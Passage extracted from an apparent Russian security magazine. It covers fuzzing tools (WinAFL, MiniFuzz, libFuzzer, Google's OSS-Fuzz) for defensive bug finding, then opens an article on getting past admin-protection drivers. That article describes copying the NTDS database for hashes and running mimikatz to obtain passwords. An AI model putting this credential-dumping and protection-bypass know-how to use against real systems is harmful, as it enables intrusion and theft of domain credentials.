дов. Фаззеры форматов файлов помогут протестировать подобные вещи.


Аргумен ты коман дной стро ки и перемен ные окру жения
Зачастую утилитам требуются параметры командной строки: это может быть
путь файла, аргумент выполнения, да много чего еще. Но что, если передать
на вход нечто, чего программа совсем не ждет? Как самое простое, если
программа просит указать какой‐то путь, то вряд ли она всерьез рассчитыва‐
ет, что путь будет состоять из тысячи символов. Вполне возможно, что
передача такого аргумента «неподготовленному» приложе нию переполнит
стек и вызовет обрушение.
   Сказанное выше в равной степени относится и к переменным окружения.
По сути, это поч ти то же самое, что и фаз зеры командной строки, только
на вход берутся параметры не из аргументов, а из одной или нес кольких
переменных сре ды окру жения. А дальше сценарий приблизительно такой же,
как и в случае перепол нения большим аргу ментом командной строки.


Запросы IOCTL
Достаточно полезная штука, когда нужно посмотреть, как реагируют на зап‐
росы IOCTL различные драйверы режима ядра. Помимо устройств и перифе‐
рии, драйверами зачастую пользуются некото рые программы для взаимодей‐
ствия с системой. Конечно, структура IRP‐зап роса почти всегда неизвес тна,
но перехваченные пакеты мож но использовать в качестве основы для кор‐
пуса.


Се тевые про токо лы
Такие фаззеры бывают заточены под извес тные про токолы, но есть и все‐
ядные экземпляры. Например, фаз зер OWASP JBroFuzz тестирует реали‐
зации известных протоколов на предмет наличия таких уязвимостей, как меж‐
сайтовый скриптинг, переполнение буферов, SQL‐инъекции и многое дру гое.
С другой стороны, есть утилита SPIKE, которая может протестировать нез‐
накомые протоколы на многие уяз вимос ти.


Браузерные движ ки
Да, даже для поиска дыр в браузерах есть специальные фаззеры. На сегод‐
няшний день современные бра узеры очень сложны и содержат множество
движков: они обрабаты вают различные версии документов, протоколов, CSS,
COM, DOM и многое другое. Так что участники раз личных bug bounty ищут
дыры не только голыми руками. :)


Опе ративная память
В  эту  категорию  входят дос таточно узкоспециализированные фаззеры,
используемые для модификации данных программ в опе ративной памяти.
Бывают полезными при тестирова нии каких‐либо динамических антидампов
и утилит со встро енной защитой.


ПРОБЛЕМА ПОКРЫТИЯ
Разумеется, и у фаззеров существуют проб лемы: дело в том, что из‐за слож‐
ности некоторых программ фаззерам быва ет трудно «дотянуться» до опре‐
деленных частей кода. Это свя зано с глубиной вложения или какими‐либо
другими специфичными условиями исполнения. Раз работчики фаззеров
пытаются бороться с недостаточным покрытием кода различны ми путями.
   Тут на помощь приходит обратная связь, когда фаз зер получает информа‐
цию о поведении программы бла года ря сиг нализирующим инструкциям
в исполняемом файле. Это называется инс трументацией и позволя ет фаз‐
зеру корректировать вход на следующем раунде, чтобы попытаться улучшить
покрытие.
  Но и здесь нас подстерега ют различные проб лемы: например, когда софт
доступен только в скомпилиро ванном виде и нет исходных текстов, либо
из‐за динамической инструментации тестиру емого приложения сильно про‐
седает производительность, либо обработка трас сы занимает достаточно
много процессорного времени.
  Кроме всего это го, существу ет прос тая проблема совместимос ти с раз‐
личными версиями операционных систем, как Windows, так и *nix. Чем слож‐
нее фаззер и чем пристальней он смотрит на поток выполнения приложе ния,
тем крепче он привязывается к особенностям ОС.
   Как видишь, фаззеров очень много, и под каж дую задачу можно най ти спе‐
циально разработанный инс трумент поиска уязвимостей. Многие фаз зеры
написаны под *nix‐подоб ные ОС, но есть и такие, которые работают с Win‐
dows. Давай поб лиже рас смот рим парочку раз нотипных фаззеров: WinAFL
и MiniFuzz.


WINAFL
WinAFL — это форк популярного фаззера AFL (American fuzzy lop), пор‐
тированный под Windows корпорацией Google. Он использует инструмен‐
тацию тестовых файлов, как статичес кую, когда есть исходные коды приложе‐
ния, так и динамическую, когда инс трументирова ние происходит «на лету».
В этом помогает библиотека для ана лиза бинарников DynamoRIO.





                       Фаз зер WinAFL

Как только что‐то пошло не так в исследуемом приложе нии (например, оно
обрушилось), данные, которые к этому привели, копируются в отдельную пап‐
ку для дальнейше го исследования. У фаз зера есть множество опций запуска,
давай рассмотрим самые важ ные.
 • i [каталог] — каталог входных тестовых кей сов. Примечательно, что
   вместе с фаззером «из коробки» идет несколько простых тестовых кейсов
   для различных типов файлов.
 • o  [каталог] — каталог выходных данных, куда будут помещаться
   результаты работы фаззера.
 • D [каталог] — опция, которая говорит фаззеру использовать динами‐
   ческую инструментацию на базе DynamoRIO. Для этого мы должны допол‐
   нительно указать каталог, где установлен этот инс трумент.
 • Y — опция для статической инструментации.

Если с динамической инстру ментацией все понятно, то со статичес кой могут
возникнуть проблемы: нап ример, прог рамма instrument.exe, которая приз‐
вана инструментировать файлы в Windows, пока еще не понимает пос ледние
версии Visual Studio SDK и не работает с программами, собранными в Visual
Studio 2019.
   Когда все готово и файл инс тру ментирован, дос таточно выполнить коман‐
ду afl‐fuzz.exe  ‐Y  ‐i  input  ‐o  output  ‐‐  test.exe. Эта команда
запустит процесс поиска уязвимостей для тестовой программы со статичес‐
кой инструментацией.


MINIFUZZ
Теперь давай рассмотрим еще один фаззер под наз ванием MiniFuzz. Он раз‐
работан в ком пании Microsoft и достаточно дру желюбен по отношению
к пользователю (да, тут даже есть гра фичес кий интерфейс!). Также дос тупна
интеграция с Visual Studio.





                       Фаз зер MiniFuzz

Разработчики рекомендуют делать не менее 100 000 файлов на каждый фай‐
ловый формат. При этом каждый поданный на вход файл — это отдельная
итерация фаззинга. Следова тельно, требует ся набор эталонных файлов.
Например, если ты решил протес тировать поведение приложения в ходе
обработки архивов *.zip, в пап ку шаб лонов тебе необходимо будет сложить
около ста таких файлов‐образцов. Мож но положить и больше, фаз зер будет
только рад! А вот если положить меньше, то эффективность процесса замет‐
но упадет.
  Далее фаззер случайным образом выбира ет файл из эталонного набора
и изменяет его, посылая в подопытное приложение. Если при этом возникает
обрушение, файл записывается в папку crashes, где его потом можно будет
подробно изучить и выяснить, что имен но вызвало сбой.
  Все настройки фаззера хра нятся в файле minifuzz.cfg в формате XML.
Немного пробежимся по самым интересным опциям (очевидные я опустил
для краткости).
 • Command  line  args — в этом поле мож но добавить недос тающие
   параметры командной строки, если эти данные нужны во время фаззинга.
 • Allow process to run for — определяет время работы экземпляра
   тестируемого приложения. Не следует уста навливать маленькое значение,
   ведь тогда фаззер может не успеть отработать.
 • Shutdown method — метод завершения запущенного экземпляра тес‐
   тового приложения. Поддерживаются методы ExitProcess (завершает
   процесс коррек тно), WM_CLOSE (корректное завершение для оконных при‐
   ложений) и TerminateProcess (завершает процесс аварийно).
 • Aggressiveness — параметр определяет, насколько сильно будут иска‐
   жаться образцы файлов перед тем, как попадут в приложение. Если ты
   безуспешно ждешь результата вот уже долгое вре мя, стоит подумать
   над увеличением это го значения.


ПРАКТИКА
Для того чтобы понять на деле, как именно про исходит поиск ошибок
при помощи WinAFL, мы напишем небольшую тес товую программу, внутри
которой будет функция с дос тупом по нулево му указателю. Согласись, дос‐
таточно распространенный пример ошиб ки, от которой не зас трахован никто
в этом мире. Код, который должен упасть (и не отжаться), будет выглядеть
примерно так:


int crash() {
  int *x = NULL;
  int y = *x;


  printf("%s", y);


  return 0;
}

Как именно ее вызывать — тут уже на усмотрение программис та. Я буду
передавать в качестве аргумента командной строки «вол шебный» параметр,
который вызывает функцию по усло вию if (argc == 2 && !strcmp(argv[
1], "key")). Кроме того, для уско рения фаззинга можно «обернуть» тес‐
тируемую функцию в цикл:


while (__afl_persistent_loop()) {
  ...
}

Управляющая функция цикла находится в файле winafl‐master\afl‐sta‐
ticinstr.h, который необ ходимо будет подключить к проекту. Кроме того,
это добавит в проект диаг ностичес кие сообщения.





           Подготов ка файла к дальнейшей инстру ментации

Как видишь, файл еще не готов к фаз зингу и WinAFL заботливо напоминает
нам, что мы забыли его инстру ментировать. Давай исправим это командой


$ instrument.exe ‐‐mode=afl ‐‐input‐image=tst.exe ‐‐output‐image=
instr_crash.exe





                        Инстру ментация

Кроме того, в свой ствах компоновщика необ ходимо добавить два параметра:
/PROFILE — включит поддержку профилирования и /SAFESEH — безопасная
обработка исключений. Пос ле это го все готово и мож но запус кать фаззер:


$ afl‐fuzz.exe ‐Y ‐i in ‐o out ‐t 500+ ‐‐ ‐fuzz_iterations 10000 ‐‐
instr_crash.exe

Здесь мы указываем то, что файл статичес ки инс трументирован, указываем
каталог in, где расположены тест‐кейсы, и каталог out, где будут результаты.
Также дополнительно сообщаем время ожидания обработки каждой ите‐
рации (в миллисекундах) и количество итераций тестирования. Процесс
работы фаззера выглядит следующим образом.





                      Работа фаззера WinAFL

Тут стоит напомнить, что фаззинг в реальных условиях может длиться неделя‐
ми. К счастью, у нас все пойдет быстрее. После того как мы обнаружим
падение приложения, в катало ге out можно будет найти файлы с названиями
вида id:000003,src:000001,op:flip1,pos:1. Внутри содержится  диаг‐
ностическая информация с пояснениями, при мерно такими:



  Program received signal SIGSEGV, Segmentation fault.
  0x0802f36a in crash  at tst.c:32
  32  int y = *x;
  #0  0x0802f36a in crash at tst.c:32


  crash dump #:1


Как видишь, лог подробный, в нем ука зана и функция crash, и тип ошиб ки
SIGSEGV. Это значит, что «волшебный» параметр был сгенерирован фаз‐
зером верно и все сработа ло.


ЗАКЛЮЧЕНИЕ
В этой статье я постарался рас сказать, что такое фаз зеры, какими они быва‐
ют и как работают. Как и любая другая статья в журнале, это все го лишь век‐
тор для дальнейшего развития и самос тоятельного изу чения (а вовсе не все‐
объемлющее руководство). Поэто му, вооружившись уже полученными зна‐
ниями, ты всегда сможешь их приумножить, проводя собственные экспе‐
рименты.
COVERSTORY
ФАЗЗИНГ
   ГЛАЗАМИ ПРОГРАММИСТА





    КАК В GOOGLE АВТОМАТИЗИРУЮТ
          ПОИСК БАГОВ




Когда количес тво строчек кода в твоих
программах   исчисляется   миллионами,
поиск ошибок осложняется тысячекратно.
К счастью, сегодня есть возможность авто‐
матизировать  тестирова ние  с помощью         Дмитрий Вьюков                                                                                 Работаю над средствами
фаззеров. Как они работа ют, почему их        динамическогопоиска ошибок анализав Google.и
стоит применять и на что они способны —          dvyukov@gmail.com
об этом ты узнаешь в сегодняшней статье.


Традиционная практика тестирования предполагает, что на вход программы
подаются самые разные данные — корректные, почти корректные и гранич‐
ные случаи. Это позволяет убедиться, что в целом код работает правильно
и серьезных ошибок в логике работы нет. Однако при этом качество провер‐
ки целиком зависит от качества тестов и их количества.
  Поэтому всегда есть веро ятность того, что какой‐то важный случай был
упущен, не вошел в фиксированный набор тес тов и наш код все‐таки содер‐
жит ошибку, которую дос таточно талантливый хакер сможет экс плуатировать.
Так что даже положительный результат не следует рассматривать как повод
прекратить тестирование. Но ведь и слепо перебирать все воз можные зна‐
чения — тоже не вариант, никаких ресурсов не хва тит.
  Фаззинг берет лучшее от двух существу ющих подходов. Мы не ограничи‐
ваем себя конечным количеством тес товых случаев и постоянно генерируем
случайные входные данные для нашего кода, но при этом каждая новая пос‐
ледовательность исполь зует информа цию из предыду щих попыток для мак‐
симизации результата.
  Сразу возникает резон ный вопрос — могут ли случайные данные что‐то
протестировать в действительности? Предположим, мы хотим проверить
компилятор С/C++ и посыла ем на вход сгенерированные последовательнос‐
ти символов. Совер шенно очевидно, что мы получим много ошибок от ком‐
пилятора на стадии лексиког рафичес кого анализа и парсера выраже ний,
но при этом едва затронем оптимиза цию и генерацию кода. Выглядит
не очень‐то эффектив но, согласись. К счастью, это напрасное опасение.


ГДЕ МОЖНО ПРИМЕНЯТЬ ФАЗЗИНГ
Фаззинг можно успешно использовать вез де, где на входе тре буются слож‐
ные данные. Тривиальные случаи реша ются простым перебором, но если
                                                   80у тебя есть хотя бы десять байт входных данных, то 2  уже создают проблему
при тестировании, и обычные тесты тут вряд ли спра вятся.
  Именно поэтому самые рас простра ненные случаи применения фаззинга
приходятся на различные парсеры (XML, JSON), мультимедиакодеки (аудио,
видео, графика), сетевые протоколы (HTTP, SMTP), криптографию (SSL/TLS),
браузеры (Firefox, Chrome) и компрессию фай лов (ZIP, TAR). Также целями
фаззинга могут быть компиляторы (C/C++, Go), интерпретаторы (Python, JS),
библиотеки для обработки регулярных выражений (regexp), базы данных
(SQL) и комплекты офисных приложений (LibreOﬃce).
   Чрезвычайно важен сегодня и фаззинг операционных систем, раз личных
гипервизоров и вир туаль ных машин. Так что мы в Google даже запустили спе‐
циальный фаззер syzkaller, который непрерывно тестиру ет несколько сборок
ядра Linux, FreeBSD, NetBSD, а также Android и ChromeOS.
  Резюмируем: фаззинг абсолютно необходим для тех программ, которые
работают на границе доверия и используют входные данные из ненадежных
источников.


САНИТАЙЗЕРЫ
Прежде чем мы перейдем к основной теме статьи, следует немного расска‐
зать о санитайзерах. Это инстру менты для динамического тестирования,
помогающие в поиске самых раз ных ошибок в программах. Переполнение
буферов (глобальных, на стеке или в куче), использование пос ле освобож‐
дения, утечки памяти, обра щение к неинициализированным переменным —
все это повод для исполь зования санитайзеров.
  Однако работой с памятью их возможнос ти не ограничиваются. Они также
позволяют обнаруживать сос тояние гонки для потоков, ситу ации взаимной
блокировки, обращения по нулево му указателю, деление на ноль (куда же
без него), перепол нения для типов данных и некорректные битовые сдвиги —
одним словом, солидную часть ошибок, которые вызывают неопределенное
поведение в программах.
  Санитайзеры очень помога ют во время отладки. Для их использования
достаточно скомпилировать  исходники  с вклю ченной инс трументацией,
которая добавит специальные команды в исполняемый файл. По ним можно
будет следить за ходом выполнения прог раммы и состоянием памяти.
При обнаружении ошибок будет сгенери рован отладочный вывод и прог‐
рамма завершит работу.
  Сегодня  работу  с  санитайзерами поддерживают компиляторы GCC
и Clang. Настоятельно рекомендую обра тить на них внимание. Мало просто
сгенерировать фаззером некорректные входные данные, которые обрушат
программу. Ошибку следует устранить, а для этого надо собрать максимум
информации. Имен но в этом и помогают санитайзеры. Их совместное
использование повышает эффективность тестирова ния. Так что в некотором
смысле фаззеры и санитайзеры соз даны друг для друга. :)


ТИПЫ ФАЗЗЕРОВ
Существует несколько основных типов фаззеров, они отличаются подходами
к генерации входных данных. Некоторым для работы требуется стартовый
набор примеров, другим нужны пра вила, по которым эти примеры могут быть
выведены. Важную роль также играет случайность, которая позволяет фаз‐
зерам создавать все новые и новые вхо ды.


На осно ве грамматики
Таким фаззерам для работы требуется определенный набор правил — грам‐
матика для построения входных данных. Как толь ко фаззеру будут известны
эти правила, он сможет генерировать новые комбинации на их основе.
При этом можно позволить себе иногда отклонять ся от грамматики и не всег‐
да следовать ей, подавая на вход тес тируемой прог раммы некорректные дан‐
ные.
  Подобные фаззеры генерируют хорошие, достоверные последователь‐
ности, доля  случайности в них относительно невелика. Однако важно
понимать, что писать такие фаззеры — дело тру доемкое. Во‐первых, грам‐
матику следует определить самос тоятельно (в редких случаях можно взять
уже готовую). Во‐вторых, качество работы фаз зера будет напрямую зависеть
от той грамматики, что ему переда ли.


На осно ве мутаций
Такой тип фаззеров на каждом этапе случайным образом изменяет входные
данные из предыдущих попыток. При этом для старта ему тре буется набор
репрезентативных входов (корпус), который будет использоваться для даль‐
нейших мутаций. В качестве корпуса можно взять данные пользователей
или существующие тесты. Во время сво ей работы такой фаз зер слегка изме‐
няет готовые последовательности (перес тавляя биты и бай ты), комбинирует
и сочетает их вариации и пода ет в прог рамму.
  При этом никаких дополнительных уси лий от разработчика тут не требует‐
ся (разве что написание специальных алгоритмов мутаций), но и качество
входных данных у таких фаззеров обычно среднее.


Постро ение грамматики по дан ным
Также есть способ сочетать оба опи санных выше подхода. Специалисты
по обработке данных и машинному обучению могут попытаться построить
грамматику на основе уже имеющейся информации. Однако оценить резуль‐
тат на выходе таких фаззеров зачас тую непросто.


На осно ве пок рытия кода
Подобные фаззеры устроены по принципу генетического алгоритма и стре‐
мятся максимизировать покрытие тес тового кода. С практической точки зре‐
ния это один из самых эффективных на сегодня типов фаз зеров. На этой
основе работает libFuzzer, и о нем я рас ска жу подробнее.
   Упрощенно работу фаззера в форме псевдокода можно представить так:


Build the program with source coverage instrumentation;
Collect the initial corpus of inputs (optional, but recommended);
while (true) {
    Choose a random input from corpus and mutate it;
    Run the target program on the input, collect code coverage;
    If the input gives new coverage, add mutation back to corpus;
}

Сперва программа компилиру ется с инс трументацией по покрытию кода.
Это позволяет нам при прогоне прог раммы понять, какие строчки кода были
исполнены по факту. Дальше собирается реп резентативный корпус данных.
На самом деле это опциональный шаг, можно начать с пустого набора дан‐
ных. Дальше фаззер выбирает один из вариантов, мутирует его и подает
на вход программы. Если при этом было получено новое кодовое покрытие,
успех фиксируется и данные добавляют ся в набор.
  Попытаемся  теперь  оценить,  нас колько эффективен  этот  алгоритм
и почему он вообще работа ет. В качес тве при мера возьмем такой код:


if (input[0] == `1`) {
    if (input[1] == `3`) {
        if (input[2] == `3` && input[3] == `7`) {
            // Potential out‐of‐bounds write
            input[input[4]] = input[5];
        }
    }
}

Чтобы попасть на строчку кода с потенциальной ошибкой, нам нужно пра‐
вильно угадать четыре байта входного потока. Если использовать прос той
                                                        32перебор «грубой силой», это потребует от нас около 2   попыток. Крайне
расточительно! Попробу ем взглянуть, как с такой задачей справится фаззер.
   Если входной кор пус пуст и не содержит никаких данных, результат первых
попыток окажется полностью случайным. Это будет продолжаться ровно
до того момента, пока фаз зер не угадает первый байт. На это потребуется
          8порядка 2  итераций. При этом фаззер зафиксиру ет новое покрытие, и пра‐
вильный вход будет наконец добавлен в корпус.
  Следующие попытки используют полученный результат в качестве отправ‐
ной точки и последовательно улучшают наше покрытие. Легко под считать, что
                                                          10с таким подходом потребуется проверить порядка 2   вариантов, чтобы
обнаружить ошибку. По сути, мы умень шили число вари антов более чем
в миллион раз и свели экспоненциальную проб лему к полиномиальной, что
очень неплохо.


             INFO

                      Если пример выше тебя не впечатлил и кажет ся
                     слишком простым, рекомендую почитать заметку
                        в блоге создателя AFL Михала Залевского —
                             Pulling JPEGs out of thin air. В качестве демонс‐
                        трации возможностей фаззеров Залевский син‐
                       тезировал корректный файл формата JPEG (со
                       всеми  полями  и  заголовками)  практически
                       из ничего. И да, судя по результатам, его фаззер
                       явно неравнодушен к абстрак тно му искусству.


При этом на каждом эта пе изменения данных в корпусе вовсе не обя заны
быть  сложными. Мы можем  просто  переставлять,  добавлять,  удалять
или инвертировать отдельные биты или байты в одном входе. Допустимо
скрещивать различные входы, получая новые данные для следующих ите‐
раций. Или добавлять данные из какого‐либо сло варя. Можно использовать
«магические циф ры», которые должны генерировать ошиб ки в граничных слу‐
                 8   31  32чаях. Например, 2  , 2   , 2  + 1 и так далее.
  Впрочем, это только тривиальные способы. Справится ли фаззер с такими
условиями в коде?


if (*(uint64_t*)input == 0xDEADBEEFCAFEBABE) {
    …
}
if (crc32(input + 4, size ‐ 4) == *(uint32_t*)input) {
    …
}

Описанный выше процесс пос ледова тельной мутации тут уже не сработает —
для увеличе ния пок рытия и продвижения по коду условие нужно угадать сразу
и целиком. Поэтому мы разработали нес коль ко подходов, которые перех‐
ватывают   такие   сравнения   при   инс трументации     (‐fsanitize‐
coverage=trace‐cmp). Это поз воляет в момент исполнения получить дос туп
к операндам и добавить их в корпус. Также поддерживаются сравнения
в функциях strcmp и memcmp.
  И это открывает для нас новые возможности. Если взять «правильный»
операнд и вставить в определенное место в нашей входной последователь‐
ности, то ветвле ние в коде можно будет проскочить за одну попытку.
  Другой способ основан на рас стоянии Хэмминга. Мы считаем число раз‐
личных битов в операндах, и, если в ходе мутации нам удалось как‐то сок‐
ратить это расстояние, вход запоминает ся для даль нейше го использования.
Таким образом мы последовательно приб лижа емся к необходимому зна‐
чению.


ПРИМЕР ФАЗЗИНГА
Чтобы написать фаззер на основе libFuzzer, надо сделать ровно две вещи.
Во‐первых, реализовать свою функцию Fuzz Target, которая будет передавать
данные в тестируемую программу. Во‐вто рых, программу нужно скомпилиро‐
вать с инструментацией и скомпоновать с биб лиотекой libFuzzer. Наиболь‐
шие трудности в C++ обычно вызывает именно пос ледний этап, но мы раз‐
берем оба.


/* example for boost::regex library */
int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size) {
    try {
        std::string str((char*)Data, Size);
        boost::regex e(str);
    }
    catch (const std::exception&) {}
    return 0;
}

Исключения здесь пришлось перехватить, так как библиотека regex опо‐
вещает о  некорректных выражениях именно  с помощью  исключений.
Как видишь, код очень прос той и не требует каких‐то особых знаний о фаз‐
зерах. Данные Data генерирует непос редствен но библиотека libFuzzer, и их
нужно лишь направить в правиль ную функцию.
   Второй шаг — это соб рать все в один исполняемый файл. Собирать будем
с санитайзерами и инстру ментацией кода.


$ ./b2 cxxflags="‐fsanitize‐coverage=trace‐pc‐guard ‐fsanit
ize=address" toolset=clang install

Первый флажок компилято ра добавляет инстру ментацию для покрытия кода
в исполняемый файл, второй отвечает за работу ASan — санитай зера адре‐
сов.


$ clang++ fuzzer.cc ‐fsanitize‐coverage=trace=pc‐guard ‐fsanitize=
address libFuzzer.a

На этом этапе мы собираем сам фаз зер (с теми же флажками компилятора)
и компонуем его с библиотекой libFuzzer. Именно в ней происходит
основной цикл фаззинга, и лишь изредка управление передается нашей фун‐
кции.
  Работа фаззера была пло дотворной, и уже через полчаса он нашел в коде
несколько ошибок, причем некоторые были достаточно серьезными, в том
числе с перепол нением стека. За подробностями ты можешь обратиться
на сайт проекта. Стоит отметить, что все ошиб ки были оперативно устранены
авторами библиотеки. Но, я думаю, всег да можно попытаться нафаззить
что‐то еще. :)


             INFO

                    Фаззинг  —   процесс   все‐таки   случайный,
                      и заранее никогда нельзя угадать, сколько вре‐
                     мени  потребуется,  что бы  обнаружить  новую
                    ошиб ку. Если ты хочешь сперва пот ренироваться
                       на готовом примере, рекомендуем начать с прак‐
                        тической части из нашей предыдущей  статьи
                      по этой теме.



ПОИСК ЛОГИЧЕСКИХ ОШИБОК
Одна из наиболее интерес ных особенностей фаззеров — их возможность
обнаруживать логические ошиб ки в прог раммах. Когда ничего особо кри‐
минального как будто не происходит, но при этом программа все равно ведет
себя некорректно и выда ет неп равиль ный резуль тат. Зачастую с помощью
фаззеров можно находить много таких оши бок.
  До этого момента мы в основном обсужда ли явные падения, связанные
со стабильностью и безопас ностью работы. Но с помощью фаз зинга можно
находить ошибки и в логике работы программы. На первый взгляд кажется,
что это малоре ально, ведь кто‐то должен заранее сообщить фаззеру пра‐
вильный результат для каждого входа из корпуса.
  К счастью, если проявить немного смекал ки, способы все равно есть.
Например, результаты мож но проверять на достоверность, хотя бы приб‐
лизительно. Другими словами, выход программы должен выглядеть разумно
(а не в стиле «полтора землекопа»).
   Скажем, если работает декодер несжимающего формата изображений
и для файла в 100 байт на выходе получается 100 Мбайт, то тут явно где‐то
ошибка. Или если известно, что в правиль ном выходе дол жна содержаться
какая‐то определенная строчка или заголовок, а они отсутствуют — это тоже
повод задуматься.
   Если наш процесс обратим, то результаты можно попробовать прогнать
через взаимнообратную функцию и сравнить. Это может быть случай шиф‐
ровки и дешифровки сообщений, архивации и разархивации файлов и про‐
чее. Выход должен быть при этом равен исходному вводу.
  Порой мы все‐таки зна ем правиль ный результат и нам есть с чем срав‐
нивать. Например, если ты хочешь фаз зить какую‐нибудь специфичную
реализацию сортировки, которая знает о данных что‐то дополнительно
и использует это для более эффективной работы, — результат всегда можно
сравнить со стандартными функциями и убе дить ся, что данные на выходе
отсортированы в правильном порядке.
  Еще один прием основан на сравнении двух реализаций. При этом нужно
заранее проверить обе программы: они должны выдавать один и тот же
результат на одинаковых данных. Или хотя бы синхронно генерировать схо‐
жие ошибки в случае некорректно го входа. Конечно, писать новую библиоте‐
ку только для фазз‐тестов мало кому хочется, но всегда можно попробовать
найти альтернативы в сво бодном дос тупе.
  И разумеется, сторонняя реализация необязательно дол жна быть на том
же языке. Либо это может быть простой и неоптимизированный код против
сложного. В любом случае варианты всегда найдут ся, стоит только дать волю
воображению!


КАК ФАЗЗЯТ В GOOGLE
Почему вообще фаззинг используют в Google? Раз работка сегодня стала
быстрее, и кода у нас очень много. Корректность кода очень важна, стабиль‐
ность все еще важна, а безопасность, разумеется, на первом месте. В такой
ситуации нужно двигать ся быстро, но при этом держать под контролем сто‐
имость разработки. Просто нанять боль ше раз работчиков уже не получается,
на рынке труда нет столько ква лифицированных кадров.
   Традиционное тестирование в такой ситуации уже не работает и не справ‐
ляется с ростом кодовой  базы. Уход  в  автомати ческое  тестирование
с помощью фаззинга на этом фоне выг лядит логичным решением. Для этого
мы призываем разработчиков писать фазз‐тес ты. Они подхватываются сис‐
темой фаззинга и добавляются в остальной набор тес тов.
   Также у нас на серверах развернут OSS‐Fuzz. Это система непрерывного
фаззинга проектов с открытыми исходниками. Сегодня на него подписано
уже более 200 проектов. Если у тебя есть востребованная и дос таточно
популярная библиотека, то ты можешь поучаство вать. С тебя — фаззер
и инструкции по сборке пос ледней версии, с нас — хостинг на кластере
и гарантированный поток обна руженных ошибок.
  В 2017 году результаты работы этого проекта выглядели следующим
образом: более двух тысяч найденных ошибок в шестидесяти проектах
с открытым кодом. На сегодняшний день число подписанных на сервис про‐
ектов увеличилось более чем в три раза, а количес тво ошибок перевалило
за десять тысяч. Около 35% этих ошибок — неопределенные ситу ации, най‐
денные с помощью санитайзера ubsan, примерно 15% — ошибки при работе
с памятью и перепол нение буферов, и более 10% — это другие ошибки
самого разного рода.
   Также у нас есть родс твенная система ClusterFuzz для браузера Chromium.
Сегодня она поддерживает более 350 фаз зеров, основная часть из них на lib‐
Fuzzer и AFL, но есть и совершенно кас томные вещи. Сис тема автоматически
добавляет информацию о найденных ошиб ках и тес тиру ет присланные
решения.
  Кроме  того, мы  ста раемся  популяризовать фаз зинг  за пре делами
Google — мы проводим фаззатоны (по аналогии с хакатонами), недели фаз‐
зинга и выступаем с докладами на про фильных конференциях.
   Как‐то я задался воп росом: а сколько всего ошибок мы обнаружили
с помощью фаззинга? В 2017 году эта цифра была порядка пятнадцати тысяч,
во всех наших проектах. То ли код у нас слиш ком плохой, то ли фаззеры
слишком хорошие — я так пока еще и не определился. :)


ВЫВОДЫ
Фаззинг — это ни в коем случае не панацея. Он не заменяет другие методи ки
тестирования, но и его заменить нельзя. Самое главное — это рабочая тех‐
ника, которая хорошо дополняет арсенал поис ка уязвимостей. Фаз зеры
в первую оче редь стоит применять там, где возникают вопросы безопас‐
ности, на границе доверия и там, где есть пользовательский ввод. И пусть
наши программы станут лучше.
 ВЗЛОМ





   Максим Суханов
 Ведущий специалист по
     компьютерной
криминалистике компании
        BI.ZONE
      ms@bi.zone


ПОБЕГ
ПЛОХОГО
АДМИНА
 КАК ОБОЙТИ ЗАЩИТУ ОТ АДМИНА
 И ОБМАНУТЬ АНТИВИРУС




 Представь себе,  что ты получил доступ  к контроллеру
 домена с правами админа. Твои следующие шаги? Я бы сра‐
 зу  скопировал себе  базу NTDS  (ведь там  есть хеши
 для доменных учеток), а еще бы посмотрел, что покажет
 mimikatz, — это могут быть хеши от паролей для различных
 учеток и иногда сами пароли открытым текстом.


 Вот только базу NTDS прос то так не скопировать — она представляет собой
  залоченный файл, который нельзя открыть и про читать. Чтобы это обойти,
  атакующие вычитывают эту базу напрямую с дис ка, с помощью собс твенного
 парсера NTFS. Программы вро де mimikatz тоже работают не в лоб, а с
  некоторыми хитростями.
   И однажды можно обнаружить, что на одном из серверов прочитать дан‐
 ные с диска напрямую нельзя — что‐то меша ет. И mimikatz тоже завершается
  с ошибкой. Хотя права админа есть. Что же это?


 ЗАЩИТА ОТ АДМИНА В ИСПОЛНЕНИИ ДРАЙВЕРА
  Когда‐то, во времена Windows XP, почти все поль зователи работали с пра‐
 вами админа. Исклю чения встречались в основном в корпоративном секторе.
    Сейчас от такой практики отходят, но в реальности многие взломы так
  или иначе приводят к получению ата кующим прав админа. Это может про‐
  исходить в результате экс плуатации уяз вимос ти, ошибок конфигурации соф‐
  та, работающего с повышен ными привилегиями, или банального перебора
  паролей. Получение атакующим прав админа на одной из машин в домене —
  это путь к контрол леру домена. Ата кующий может, например, перехватить
  пароль доменного админа на одной из пользовательских машин (когда
  на нее зайдет сам админ), а затем залоги ниться на контрол лер домена.
    Поскольку бизнес слишком медленно реаги рует на такие угрозы (да и Mi‐
  crosoft те бреши, которые за уяз вимос ти не считаются, закрывает очень дол‐
  го), то некоторые производители начали реализовывать защиту от админа.
  Такая защита бывает в антивиру сах (в виде модулей самозащиты), также есть
  отдельные продукты, предназначенные для защиты серверов и рабочих стан‐
 ций от действий «пло хого админа».
    Хорошо известно, что защиту на том же уровне привилегий реализовать
 можно  только  через  усложнение  (security  through  obscurity),  поэтому
  для защиты от программ, работающих с правами админис тратора, то есть
  в ring 3, нужно применять драйвер, который работает в ring 0.
   С помощью драйвера мож но запретить определенные опасные операции
  с процессами, дисками, файлами и реестром.
   Модули самозащиты антивиру сов, как правило, препятс твуют удалению
  или  отклю чению  антивиру са, изменению  его компонентов, изменению
  или удалению его конфигура ции. Это реализует ся при помощи перехвата
 функций API, изучения переданных им аргу ментов и блокирования опасных
 операций (путем возвра та ошибки без вызова перехваченной функции). Нап‐
  ример, перехват функции уда ления ключа реестра должен блокировать уда‐
  ление ключа реестра, если этот ключ относится к антивирусу (ведь анти вирус
 можно отключить, если удалить записи о его сервисах, — в таком слу чае
 при следующей загрузке операционной системы антивирус не запустится).
    Самозащитой антивирусов, конечно, дело не ограничивается — существу‐
  ет продукт, позволя ющий гибко настроить огра ничения для программ, в том
  числе работающих с правами админа. Этот продукт называется Symantec
  Data Center Security (DCS).
   DCS предназначен для защиты главным обра зом серверов. В его функци‐
  ональность входит защита сервисов, работающих с повышенными привиле‐
  гиями, защита операционных систем после окончания их поддержки, монито‐
  ринг целостности файлов, защита от экс плоитов. Также этот продукт реали‐
  зует некоторые функции хос товой IDS/IPS.
    Symantec DCS позволя ет задавать гиб кие пра вила для каждой программы
  (далее в статье будет говориться про версию Data Center Security Server Ad‐
  vanced 6.7.2.1390 это го программно го решения). Например, можно зап‐
  ретить одной программе читать какой‐то файл, но разрешить чтение для дру‐
  гой программы (при том, что обе программы работа ют с правами адми на).
 Или запретить модификацию определен ного файла всем программам, кроме
